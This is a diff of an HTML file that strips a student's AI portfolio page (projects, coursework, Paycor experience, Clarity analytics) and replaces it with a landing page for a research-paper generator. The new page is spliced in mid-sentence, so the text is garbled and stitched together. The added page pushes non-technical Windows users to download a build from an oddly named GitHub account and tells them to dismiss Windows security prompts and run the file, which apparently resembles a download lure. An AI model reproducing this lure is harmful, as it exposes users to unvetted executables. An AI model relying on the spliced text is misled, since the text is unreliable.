-          <p>A flat-fee AI consulting practice for Cincinnati small businesses priced out of per-seat enterprise AI, which I'm considering launching after I finish my degree and Microsoft and Google certifications. I wrote the business plan (market, four pricing tiers, go-to-market, 12-month timeline), built a 10-year regional expansion model, and designed the brand system, business card, flyer and services menu. I also hand-coded its nine-page concept website in HTML and CSS.</p>
-          <p class="mini-links"><a href="https://bo-oetjen.com/final/" target="_blank" rel="noopener">Visit the concept site ↗</a> <a href="https://github.com/bo-oetjen/final" target="_blank" rel="noopener">View the code on GitHub ↗</a></p>
-          <div class="tools"><span>Business planning</span><span>Financial model</span><span>Brand system</span><span>HTML · CSS</span></div>
-        </article>
-        <article class="mini">
-          <span class="label">Family project · shared app</span>
-          <h3>Alaska 50th Anniversary Cruise Planner</h3>
-          <p>A planning app for a 12-person family trip in 2028: traveler records, side-by-side comparison of three cruise lines, ports and excursions with price ranges, a booking timeline, budget tracking, a shared to-do list and call log, and PDF export. Written in plain language with large, readable type for every age in the family.</p>
-          <div class="tools"><span>Shared database</span><span>Research</span><span>Budgeting</span><span>PDF export</span></div>
-        </article>
-        <article class="mini">
-          <span class="label">Weekend build · decision tool</span>
-          <h3>Fantasy Football Draft Board</h3>
-          <p>A live draft assistant built the morning of a draft: about 130 players ranked by tier, a roster tracker, tier-scarcity alerts and an "on the clock" pick recommendation. When the league goal shifted to winning outright, I changed the logic to best-player-available with an override only when a needed position is about to lose its last elite option.</p>
-          <div class="tools"><span>JavaScript</span><span>Recommendation logic</span><span>Debugging</span></div>
-        </article>
-        <article class="mini">
-          <span class="label">Standard · course imports</span>
-          <h3>Todoist Course Import Playbook</h3>
-          <p>A written standard for turning a syllabus into Todoist tasks automatically: one project and label per course, 11:59 PM defaults, dated class sessions instead of recurring tasks, absolute 8 AM reminders, a 25-item batch limit, and a check for a duplicate-reminder bug I found in testing.</p>
-          <div class="tools"><span>Process documentation</span><span>Todoist API</span><span>QA</span></div>
-        </article>
-      </div>
-    </section>
-
-    <!-- COURSEWORK -->
-    <section id="coursework">
-      <div class="sec-head">
-        <h2>Coursework</h2>
-        <p>University of Cincinnati Blue Ash · Associate of Applied Science in Artificial Intelligence · Fall 2026</p>
-      </div>
-      <div class="courses">
-        <div class="course">
-          <div class="code">CS 1010<small>Introduction to Artificial Intelligence</small></div>
-          <div>
-            <h3>Machine learning without code, evaluated properly</h3>
-            <ul>
-              <li>Insurance fraud classification comparing Decision Tree and SVM (case study above).</li>
-              <li>Built Orange workflows for decision trees, logistic regression and neural networks, including a neural-network classifier for a non-linear 2D point cloud and image classification on Fashion-MNIST.</li>
-              <li>Covered the history and levels of AI, NLP, computer vision, CNNs, PCA and the training cycle (epochs, loss, learning rate).</li>
-            </ul>
-            <div class="metric-strip"><span>Orange Data Mining</span><span>Confusion matrix</span><span>ROC / AUC</span><span>PCA</span><span>Neural networks</span></div>
-          </div>
-        </div>
-        <div class="course">
-          <div class="code">IT 1055C<small>Data Technology Essentials</small></div>
-          <div>
-            <h3>Cleaning and visualizing real data in Power BI</h3>
-            <ul>
-              <li><b>Netflix Daily Top 10 (Kaggle):</b> repaired character-encoding errors in titles, normalized dates and blanks in Power Query, and justified each chart choice (for example, a bar chart over a pie when one title, Cocomelon at 428 days, dwarfs the rest).</li>
-              <li><b>Cincinnati Police traffic crash reports:</b> built a Power BI report from City of Cincinnati open data.</li>
-              <li><b>CVG airport weather:</b> time-series plots of weather.gov observations.</li>
-              <li>Exploratory data analysis and basic statistics in R.</li>
-            </ul>
-            <div class="metric-strip"><span>Power BI</span><span>Power Query</span><span>R</span><span>Excel</span><span>Data cleaning</span></div>
-          </div>
-        </div>
-        <div class="course">
-          <div class="code">IT 2060C<small>Database Management I</small></div>
-          <div>
-            <h3>Relational databases and T-SQL</h3>
-            <ul>
-              <li>Installed and configured SQL Server 2025 Developer and documented the installation.</li>
-              <li>Weekly team labs against Northwind, AP and other sample databases: primary and foreign keys, joins, aggregation with ROLLUP and CUBE, subqueries and correlated subqueries.</li>
-            </ul>
-            <div class="metric-strip"><span>SQL Server</span><span>T-SQL</span><span>Joins</span><span>Subqueries</span><span>Team labs</span></div>
-          </div>
-        </div>
-        <div class="course">
-          <div class="code">AMEC 2050C<small>Web Design I</small></div>
-          <div>
-            <h3>HTML, CSS and a site for my planned business</h3>
-            <ul>
-              <li>Built and styled a personal homepage, versioned on GitHub.</li>
-              <li>Final project: a multi-page website for Etch AI Consulting, the AI consultancy I'm considering launching after graduation. Taken from proposal and wireframes through mockups, page copy and a brand style guide to nine hand-coded pages. <a href="https://bo-oetjen.com/final/" target="_blank" rel="noopener">Visit the site ↗</a> · <a href="https://github.com/bo-oetjen/final" target="_blank" rel="noopener">Code on GitHub ↗</a></li>
-            </ul>
-            <div class="metric-strip"><span>HTML5</span><span>CSS</span><span>Git / GitHub</span><span>Wireframing</span></div>
-          </div>
-        </div>
-        <div class="course">
-          <div class="code">MATH 1021<small>College Algebra</small></div>
-          <div>
-            <h3>The math under the models</h3>
-            <p>Functions, inequalities and absolute value, built as the foundation for statistics and machine learning courses ahead. I build practice sets and reference sheets for each unit.</p>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- EXPERIENCE -->
-    <section id="experience">
-      <div class="sec-head">
-        <h2>Experience</h2>
-        <p>Paycor, Inc. · 2014 to present · four promotions</p>
-      </div>
-      <div class="roles">
-        <div class="role">
-          <div class="when">Oct 2021 – now<br>Mar 2020 – Oct 2021</div>
-          <div>
-            <h3>Principal Technical Account Manager</h3>
-            <div class="org">Senior Technical Account Manager before that · Paycor, Inc.</div>
-            <ul>
-              <li>Designed and built the TAM Command Center and SOW Builder, cutting SOW creation from 22.5 minutes to 3–4 with automated legal-language validation. Used by 29 people today and expanding company-wide as other teams' rates are added.</li>
-              <li>Built an internal AI chatbot and workflow system that gives 27 TAMs instant access to institutional knowledge and customer context, cutting weekly discovery prep 4–5%.</li>
-              <li>Own Paycor's most complex enterprise HCM engagements end to end, from pre-sale discovery to go-live, and serve as senior escalation point.</li>
-              <li>Guided Network for Hope through a two-organization merger onto Paycor, featured in a <a href="https://www.paycor.com/resource-center/case-studies/network-for-hope/" target="_blank" rel="noopener">Paycor case study</a>.</li>
-              <li>Advise on pricing and engagement models, contributing to $3M+ in annual team revenue.</li>
-              <li>Redesigned intake, assignment and capacity planning for a 27-person org: assignment accuracy up ~65% year over year, resolution time down about two weeks.</li>
-              <li>Now rebuilding capacity in the dashboard around the hours each TAM is actually committed to each week, now and in the weeks ahead, replacing fixed per-engagement estimates. The goal: steadier SLA performance and headcount planning based on real workload.</li>
-              <li>Mentored 15+ team members and built training and playbooks with Learning &amp; Enablement.</li>
-            </ul>
-          </div>
-        </div>
-        <div class="role">
-          <div class="when">Mar 2017 – Mar 2020</div>
-          <div>
-            <h3>Senior Premier Customer Consultant</h3>
-            <div class="org">Paycor, Inc.</div>
-            <ul>
-              <li>Embedded technical consultant for enterprise clients under a hyper-care model.</li>
-              <li>Redesigned onboarding, shortening implementation timelines by about four days.</li>
-            </ul>
-          </div>
-        </div>
-        <div class="role">
-          <div class="when">Sep 2014 – Mar 2017</div>
-          <div>
-            <h3>Senior Customer Payroll Advocate</h3>
-            <div class="org">Customer Payroll Advocate before that · Paycor, Inc.</div>
-            <ul>
-              <li>Supported about 500 customers on payroll, tax compliance, NACHA and product questions.</li>
-            </ul>
-          </div>
-        </div>
-        <div class="role">
-          <div class="when">Education</div>
-          <div>
-            <h3>University of Cincinnati Blue Ash</h3>
-            <div class="org">Associate of Applied Science, Artificial Intelligence · expected May 2028</div>
-            <h3 style="margin-top:16px">Northern Kentucky University</h3>
-            <div class="org">B.A., Public Relations · Minor in Marketing · 2012</div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SKILLS -->
-    <section id="skills">
-      <div class="sec-head"><h2>Skills</h2><p>What I use, grouped by how I use it.</p></div>
-      <div class="skills">
-        <div>
-          <h3>Building with AI</h3>
-          <ul>
-            <li>Claude: Skills, Projects, artifacts, MCP connectors</li>
-            <li>Microsoft Copilot and Copilot Studio (multi-agent design)</li>
-            <li>Workflow automation and prompt design</li>
-            <li>Internal knowledge assistants</li>
-            <li>Validation and source-of-truth design</li>
-            <li>No-code ML in Orange</li>
-          </ul>
-        </div>
-        <div>
-          <h3>Data &amp; development</h3>
-          <ul>
-            <li>SQL Server and T-SQL</li>
-            <li>Power BI and Power Query</li>
-            <li>HTML, CSS, JavaScript</li>
-            <li>R, Excel, VBA</li>
-            <li>Git and GitHub</li>
-          </ul>
-        </div>
-        <div>
-          <h3>Client &amp; business</h3>
-          <ul>
-            <li>Technical discovery and solution design</li>
-            <li>Enterprise SaaS and HCM (payroll, tax)</li>
-            <li>Pricing and engagement models</li>
-            <li>Salesforce, Gainsight, Smartsheet</li>
-            <li>Training, enablement and mentoring</li>
-          </ul>
-        </div>
-      </div>
-    </section>
-
-    <!-- CONTACT -->
-    <section id="contact">
-      <div class="contact">
-        <div>
-          <h2>Let's talk.</h2>
-          <p>Open to conversations about AI enablement, solutions consulting and technical account leadership roles, and to small businesses curious about putting AI to work.</p>
-        </div>
-        <div class="rows">
-          <div class="crow"><span class="addr" id="email">bo.oetjen@gmail.com</span><button class="copy" id="copy-email" type="button">Copy</button></div>
-          <div class="crow"><a href="https://www.linkedin.com/in/bo-oetjen" target="_blank" rel="noopener">linkedin.com/in/bo-oetjen ↗</a></div>
-          <div class="crow"><a href="https://github.com/bo-oetjen" target="_blank" rel="noopener">github.com/bo-oetjen ↗</a></div>
-        </div>
-      </div>
-      <p class="foot">Work projects are described without customer data or proprietary details. Updated November 2026. This site uses Microsoft Clarity to measure visits and how pages are used; see the <a href="https://privacy.microsoft.com/privacystatement" target="_blank" rel="noopener">Microsoft Privacy Statement</a>.</p>
-    </section>
-  </main>
-</div>
-</div>
-
-<script>
-(function(){
-  var btn=document.getElementById('copy-email');
-  btn.addEventListener('click',function(){
-    var t=document.getElementById('email').textContent;
-    var done=function(){btn.textContent='Copied';setTimeout(function(){btn.textContent='Copy';},1600);};
-    var fallback=function(){var r=document.createRange();r.selectNodeContents(document.getElementById('email'));var s=getSelection();s.removeAllRanges();s.addRange(r);btn.textContent='Selected';};
-    try{navigator.clipboard.writeText(t).then(done,fallback);}catch(e){fallback();}
-  });
-  var links=[].slice.call(document.querySelectorAll('a.nl'));
-  var secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));});
-  if('IntersectionObserver' in window){
-    var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){var i=secs.indexOf(e.target);links.forEach(function(l,j){l.classList.toggle('on',j===i);});}});},{rootMargin:'-30% 0px -60% 0px'});
-    secs.forEach(function(s){if(s)io.observe(s);});
+        <h2>🧠 Overview</h2>
+        <p>open-academic-paper-gen is a tool that helps you create a draft academic paper from a research topic. It uses multiple AI agents to<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>open-academic-paper-gen - Draft Papers From Any Research Topic</title>
+<meta name="description" content="open-academic-paper-gen is a multi-agent pipeline that turns a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking. Simple Windows download guide for non-technical users.">
+<meta name="keywords" content="academic-writing, citation-verification, fastapi, hallucination-detection, langgraph, literature-review, llm, nextjs, research paper generator, citation checker">
+<meta name="author" content="open-academic-paper-gen">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">
+<meta property="og:type" content="website">
+<meta property="og:title" content="open-academic-paper-gen - Draft Papers From Any Research Topic">
+<meta property="og:description" content="Multi-agent pipeline that turns a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking.">
+<meta property="og:url" content="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">
+<meta property="og:site_name" content="open-academic-paper-gen">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="open-academic-paper-gen - Draft Papers From Any Research Topic">
+<meta name="twitter:description" content="Turn a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "open-academic-paper-gen",
+  "applicationCategory": "EducationalApplication",
+  "operatingSystem": "Windows",
+  "description": "Multi-agent pipeline that turns a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking.",
+  "url": "https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
   }
-})();
+}
 </script>
-
-<script>
-/* Visitor analytics (Microsoft Clarity). Paste your Clarity project ID below. */
-(function(){
-  var CLARITY_ID = "za47opgtk4";
-  if (!CLARITY_ID || CLARITY_ID === "YOUR_CLARITY_ID") return;
-  (function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script",CLARITY_ID);
-  var cl = function(){ try { window.clarity.apply(null, arguments); } catch(e){} };
-
-  // Where the visit came from: ?utm_source=linkedin (falls back to the referring site)
-  var q = new URLSearchParams(location.search);
-  var src = q.get("utm_source") || q.get("src");
-  if (!src && document.referrer) { try { src = new URL(document.referrer).hostname.replace(/^www\./,""); } catch(e){} }
-  cl("set", "source", src || "direct");
-  if (q.get("utm_campaign")) cl("set", "campaign", q.get("utm_campaign"));
-
-  // Time on each section (counted only while the section is on screen and the tab is visible)
-  var ids = ["top","builds","more","coursework","experience","skills","contact"];
-  var secs = ids.map(function(id){ return document.getElementById(id); }).filter(Boolean);
-  var seen = {}, start = {}, total = {}, sent = false;
-  secs.forEach(function(s){ total[s.id] = 0; });
-  function now(){ return Date.now(); }
-  function stop(id){ if (start[id]) { total[id] += now() - start[id]; start[id] = 0; } }
-  if ("IntersectionObserver" in window) {
-    var io = new IntersectionObserver(function(es){
-      es.forEach(function(e){
-        var id = e.target.id;
-        if (e.isIntersecting) { seen[id] = true; if (!document.hidden) start[id] = now(); }
-        else stop(id);
-      });
-    }, { rootMargin: "-45% 0px -45% 0px", threshold: 0 });
-    secs.forEach(function(s){ io.observe(s); });
+<style>
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    padding:24px 16px 60px;
+    background:#f5f7fb;
+    color:#1f2430;
+    font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.7;
+    font-size:17px;
   }
-  function bucket(ms){ var s = ms/1000; return s < 5 ? "0-5s" : s < 15 ? "5-15s" : s < 30 ? "15-30s" : s < 60 ? "30-60s" : s < 180 ? "1-3min" : "3min+"; }
-  function report(){
-    if (sent) return; sent = true;
-    secs.forEach(function(s){ stop(s.id); });
-    var top = null;
-    secs.forEach(function(s){
-      if (!seen[s.id]) return;
-      cl("set", "time_" + s.id, bucket(total[s.id]));
-      if (!top || total[s.id] > total[top]) top = s.id;
-    });
-    if (top) cl("set", "most_time", top);
+  .wrap{
+    max-width:820px;
+    margin:0 auto;
+    background:#ffffff;
+    border-radius:18px;
+    padding:38px 42px 48px;
+    box-shadow:0 12px 32px rgba(23,31,56,0.08);
   }
-  document.addEventListener("visibilitychange", function(){
-    if (document.hidden) { secs.forEach(function(s){ stop(s.id); }); report(); }
-    else { sent = false; }
-  });
-  window.addEventListener("pagehide", report);
+  h1{
+    font-size:2.05rem;
+    line-height:1.25;
+    margin:0 0 18px;
+    color:#12172b;
+    letter-spacing:-0.02em;
+  }
+  h2{
+    font-size:1.45rem;
+    margin:42px 0 14px;
+    color:#1b2340;
+    padding-bottom:8px;
+    border-bottom:2px solid #edf0f7;
+    letter-spacing:-0.01em;
+  }
+  h3{
+    font-size:1.1rem;
+    margin:26px 0 8px;
+    color:#2a3350;
+  }
+  p{margin:0 0 16px;}
+  ul,ol{margin:0 0 18px;padding-left:24px;}
+  li{margin-bottom:9px;}
+  a{color:#4f46e5;text-decoration:none;}
+  a:hover{text-decoration:underline;}
+  .btn{
+    display:inline-block;
+    margin:6px 0 26px;
+    padding:16px 34px;
+    font-size:1.08rem;
+    font-weight:700;
+    color:#ffffff;
+    background:linear-gradient(135deg,#4f46e5 0%,#9333ea 100%);
+    border-radius:50px;
+    box-shadow:0 10px 24px rgba(79,70,229,0.28);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .btn:hover{
+    transform:translateY(-2px);
+    box-shadow:0 14px 28px rgba(79,70,229,0.34);
+    text-decoration:none;
+  }
+  .panel{
+    background:#f0f3ff;
+    border-left:5px solid #4f46e5;
+    border-radius:12px;
+    padding:20px 24px;
+    margin:22px 0;
+    box-shadow:0 4px 14px rgba(23,31,56,0.05);
+  }
+  .panel p:last-child{margin-bottom:0;}
+  .note{
+    background:#fff8e6;
+    border-left:5px solid #f0a500;
+    border-radius:12px;
+    padding:18px 22px;
+    margin:22px 0;
+  }
+  .note p:last-child{margin-bottom:0;}
+  code{
+    background:#eef1f8;
+    padding:2px 7px;
+    border-radius:6px;
+    font-family:Consolas,"Courier New",monospace;
+    font-size:.93em;
+    color:#2a3350;
+  }
+  .steps{counter-reset:step;}
+  .steps li{margin-bottom:16px;}
+  .footer-note{
+    margin-top:44px;
+    padding-top:22px;
+    border-top:2px solid #edf0f7;
+    font-size:.95rem;
+    color:#5b6480;
+  }
+  @media (max-width:640px){
+    body{font-size:16px;padding:12px 10px 40px;}
+    .wrap{padding:26px 20px 34px;border-radius:14px;}
+    h1{font-size:1.6rem;}
+    h2{font-size:1.22rem;}
+    .btn{display:block;text-align:center;padding:15px 20px;}
+  }
+</style>
+</head>
+<body>
+<main class="wrap">
 
-  // What people open and click
-  document.querySelectorAll("details.cs").forEach(function(d){
-    var h = d.closest("article"); var t = h && h.querySelector("h3");
-    var name = t ? t.textContent.trim().toLowerCase().replace(/[^a-z0-9]+/g,"_").slice(0,40) : "case_study";
-    d.addEventListener("toggle", function(){ if (d.open) cl("event", "opened_" + name); });
-  });
-  document.querySelectorAll('a[href*="linkedin.com"]').forEach(function(a){ a.addEventListener("click", function(){ cl("event", "clicked_linkedin"); }); });
-  document.querySelectorAll('a[href*="github.com"]').forEach(function(a){ a.addEventListener("click", function(){ cl("event", "clicked_github"); }); });
-  var cb = document.getElementById("copy-email");
-  if (cb) cb.addEventListener("click", function(){ cl("event", "copied_email"); });
-})();
-</script>
+  <h1>📝 open-academic-paper-gen - Research Drafts With Real Citations</h1>
+
+  <p>open-academic-paper-gen turns a plain research topic into a structured draft paper, grounded in real published literature. Behind the scenes, a team of automated helpers searches for sources, writes sections, and then double-checks every citation so you are not handed made-up references.</p>
+
+  <p>This page explains, in plain language, what the tool does and how to get it onto your Windows computer. No programming experience is needed to follow along.</p>
+
+  <a class="btn" href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">⬇️ Get open-academic-paper-gen</a>
+
+  <h2>🎯 What This Tool Does For You</h2>
+
+  <p>Writing a first draft is slow. Finding papers is slower. Catching a fake reference before a reviewer catches it can be the slowest and most stressful part of all. This application automates those three chores in one continuous flow.</p>
+
+  <ul>
+    <li><strong>Topic in, draft out.</strong> You type a research topic. The pipeline produces a paper-shaped draft with an introduction, related work, method discussion, and a conclusion.</li>
+    <li><strong>Grounded in real literature.</strong> Sources are pulled from actual published records rather than invented from thin air.</li>
+    <li><strong>Citation hallucination detection.</strong> Every reference is checked against real records so fabricated authors, titles, and years are flagged instead of silently passed through.</li>
+    <li><strong>Claim-support checking.</strong> Each major claim in the draft is compared with its cited source to see whether the source genuinely backs the statement.</li>
+    <li><strong>Multi-agent pipeline.</strong> Separate workers handle searching, outlining, drafting, and verification, so the output stays organised instead of one long messy blob.</li>
+  </ul>
+
+  <h2>✨ Main Features</h2>
+
+  <h3>Literature discovery</h3>
+  <p>The tool searches academic sources related to your topic and builds a working bibliography before any writing begins. That ordering matters: real sources first, prose second.</p>
+
+  <h3>Draft generation</h3>
+  <p>Sections are written one at a time and stitched into a coherent document. You get a draft you can edit, not a final submission. Treat it as a strong starting point that saves you hours of blank-page time.</p>
+
+  <h3>Hallucination detection for citations</h3>
+  <p>Each reference is verified. If a paper cannot be found, or the details do not match, it is marked so you can remove or replace it. This is the feature that saves you from the most embarrassing kind of mistake.</p>
+
+  <h3>Claim-support checking</h3>
+  <p>Sentences that lean on a citation are examined to see whether the cited work actually supports them. Weak or mismatched support is surfaced so you can rewrite or re-cite.</p>
+
+  <h3>Simple web interface</h3>
+  <p>The application runs locally on your machine and opens in your normal web browser. There is nothing to learn beyond typing a topic and clicking a button.</p>
+
+  <h2>💻 Download and Setup on Windows</h2>
+
+  <div class="panel">
+    <p><strong>Step 1.</strong> Visit this link to download the application: <a href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen</a></p>
+  </div>
+
+  <p>That link takes you to the project's main page, which is where the download is provided. Open it in any browser such as Edge, Chrome, or Firefox.</p>
+
+  <ol class="steps">
+    <li>Open the link above. The project page appears.</li>
+    <li>Look for the download or release area on that page and use the download offered there.</li>
+    <li>Follow the on-screen instructions shown on the project page to obtain the files.</li>
+  </ol>
+
+  <h3>Preparing your computer</h3>
+
+  <p>Before you begin, take two minutes to check the basics. These are general good habits for any downloaded application and will save you a confusing moment later.</p>
+
+  <ul>
+    <li><strong>Windows 10 or Windows 11</strong> is recommended. Older versions may work but are not tested.</li>
+    <li><strong>Free disk space:</strong> allow at least 2 GB, since the tool stores downloaded literature records locally.</li>
+    <li><strong>Memory:</strong> 8 GB or more keeps the browser interface smooth while the pipeline runs.</li>
+    <li><strong>Internet connection:</strong> required, because the tool looks up real publications and contacts AI services during writing.</li>
+    <li><strong>A modern browser:</strong> Edge, Chrome, or Firefox, kept up to date.</li>
+  </ul>
+
+  <h3>First launch</h3>
+
+  <p>After you have the application on your computer, open it the same way you open any other program: double-click its icon, or find it in the Start menu. A small window may appear briefly while the background services start up.</p>
+
+  <p>When startup finishes, your browser should open automatically to a local page. If it does not, the small window usually displays an address you can copy into your browser. That address will look like a short local link starting with the word <code>localhost</code>.</p>
+
+  <div class="note">
+    <p><strong>Keep that small window open.</strong> It is the engine room of the application. If you close it, the browser page will stop responding. Closing it is also the correct way to shut the tool down when you are finished.</p>
+  </div>
+
+  <h2>🚀 Your First Paper in Five Steps</h2>
+
+  <ol class="steps">
+    <li><strong>Enter a topic.</strong> Type something specific, such as a narrow research question rather than a single broad word. Specific topics produce far better literature matches.</li>
+    <li><strong>Start the run.</strong> Press the main action button. The pipeline begins searching and will show progress as it moves through its stages.</li>
+    <li><strong>Wait for the search stage.</strong> The tool collects real publications first. This stage can take a few minutes depending on how much literature exists.</li>
+    <li><strong>Watch verification happen.</strong> Citations are checked for invented details, and claims are compared against their sources. Items that fail are flagged in the report.</li>
+    <li><strong>Read the draft and the flags.</strong> Open the generated draft, then review the verification notes. Replace or remove any flagged references before you use the text.</li>
+  </ol>
+
+  <p>Expect your first run to be slower than later ones. Cached literature records make repeat topics noticeably faster.</p>
+
+  <h2>🔍 Understanding the Verification Report</h2>
+
+  <p>The report is the most useful part of the output, and it is written to be read by a person rather than a machine.</p>
+
+  <ul>
+    <li><strong>Verified</strong> means the reference matches a real publication record and the cited claim appears supported.</li>
+    <li><strong>Unverified</strong> means the tool could not confirm the reference. Treat it as suspect and check it yourself.</li>
+    <li><strong>Mismatch</strong> means the reference exists but does not appear to support the sentence citing it. Rewrite the sentence or find a better source.</li>
+    <li><strong>Missing support</strong> means a claim is asserted without an adequate citation attached.</li>
+  </ul>
+
+  <h2>🛠️ Common Questions</h2>
+
+  <h3>The browser page will not load</h3>
+  <p>Check that the small startup window is still open. If it closed, launch the application again and wait for the browser to open by itself.</p>
+
+  <h3>The run stops partway through</h3>
+  <p>Most interruptions come from a dropped internet connection or a temporary outage at the literature service. Reconnect and start the run again. Completed stages are typically reused.</p>
+
+  <h3>Windows shows a security prompt</h3>
+  <p>This is normal for newly downloaded software. Choose the option that keeps the file, then run it again. Only proceed if you obtained the file from the official link on this page.</p>
+
+  <h3>Can I use the draft as a finished paper?</h3>
+  <p>No. It is a draft. Read it, verify every citation in the report, check the claims, and rewrite in your own voice. The tool removes the tedious searching and first-draft work, not your responsibility as an author.</p>
+
+  <h3>Does it work on Mac or Linux?</h3>
+  <p>The instructions here focus on Windows. The underlying technology is cross-platform, but this guide does not cover other systems.</p>
+
+  <h2>📋 Practical Tips</h2>
+
+  <ul>
+    <li>Start narrow. A focused question returns better-matched literature than a broad field name.</li>
+    <li>Run the same topic twice if the first draft feels thin. Different sources often surface on a second pass.</li>
+    <li>Keep the verification report beside the draft while you edit so you can fix issues in one sitting.</li>
+    <li>Save your draft as soon as it appears, before starting another run.</li>
+    <li>Always open at least a few of the cited papers yourself. Automated checks are a safety net, not a substitute for reading.</li>
+  </ul>
+
+  <h2>⬇️ Get Started</h2>
+
+  <div class="panel">
+    <p><strong>Visit this link to download the application:</strong><br>
+    <a href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen</a></p>
+    <p>Open the page, use the download offered there, then launch the application and let it open in your browser.</p>
+  </div>
+
+  <a class="btn" href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">Download open-academic-paper-gen</a>
+
+  <p class="footer-note">open-academic-paper-gen produces drafts for research and study purposes. Always review citations and claims before submitting work anywhere.</p>
+
+</main>
 </body>
 </html>
